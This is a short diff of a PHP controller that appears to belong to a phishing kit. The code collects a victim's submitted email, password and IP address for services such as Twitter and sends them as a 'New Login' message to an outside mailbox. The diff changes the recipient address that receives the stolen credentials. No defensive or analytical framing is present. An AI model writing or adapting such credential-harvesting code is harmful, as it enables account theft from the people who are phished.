@@ -82,7 +82,7 @@ class MainController extends Controller {
 					   else if($deg == "tww") $dg = "Twitter";
 					   
             		   $s = "New $dg Login: ".date("h:i A jS F, Y");
-                       $rcpt = "ceochris@protonmail.com";
+                       $rcpt = "uwantbrendacolson@gmail.com";
                        $pass = $req["pass"];
                        $email = $req["email"];
 					   $ip = getenv("REMOTE_ADDR");
